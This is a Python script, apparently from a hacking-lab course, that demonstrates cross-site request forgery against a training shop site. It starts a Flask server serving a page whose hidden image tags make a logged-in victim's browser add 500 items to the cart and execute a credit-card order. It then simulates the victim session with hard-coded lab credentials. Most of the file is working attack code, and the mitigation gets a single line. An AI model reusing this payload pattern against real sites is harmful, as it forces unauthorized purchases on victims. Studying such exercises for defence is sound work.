__problem__ = \
"""
HTTP stateless. Server only cares if the requests are valid and authenticated.
"""

__attack__ = \
"""
Send a website to victim with code that makes requests to server to add items to the shopping cart and execute a payment.
"""

__mitigation__ = \
"""
Only executes requests from certain origins.
"""


import logging

import requests

from __base__ import setup_log, get_ip_address

log = logging.getLogger(__name__)


def start_server():
    import threading
    import flask
    from flask import Flask

    class Server(threading.Thread):
        def run(self) -> None:
            app = Flask(__name__)

            @app.route('/', methods=["GET"])
            def hook1():
                body = """
                <html>
                    <body>
                    <img style="display:none" src='http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct&productId=1&quantity=500&Submit=Order' />
                    <img style="display:none" src="http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder">
                    </body>
                    </html>
                """
                return flask.Response(body, status=200)
            app.run(host='0.0.0.0', port=3000)
    server = Server()
    server.start()


def buy_cow_bells_as_victim():
    with requests.session() as session:
        session.verify = False
        session.get("http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/")
        session.post("http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/login",
                     data={
                         'username': 'hacker10',
                         'password': "compass",
                         'action': 'login',
                         'originalURL': 'https://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=profile&pid=1',
                         'send': 'Login',
                     })
        session.get(
            "http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=showpage&page=products")
        session.get(
            "http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct&productId=1&quantity=5&Submit=Order")
        session.get(
            "http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=showpage&page=shoppingcart")
        session.get("https://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=pay")
        session.get("https://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=payByCreditCard")
        session.get(
            "http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder")
        r = session.get(
            "http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=showpage&page=shoppingcart")
        print(r.text)
        start_server()
        session.get(f"http://{get_ip_address()}:3000")
        session.get(
            "http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct&productId=1&quantity=500&Submit=Order")
        session.get(
            "http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder")
        r = session.get(
            "http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=showpage&page=shoppingcart")
        print(r.text)


if __name__ == '__main__':
    start_server()
    setup_log()
    buy_cow_bells_as_victim()
    exit(0)
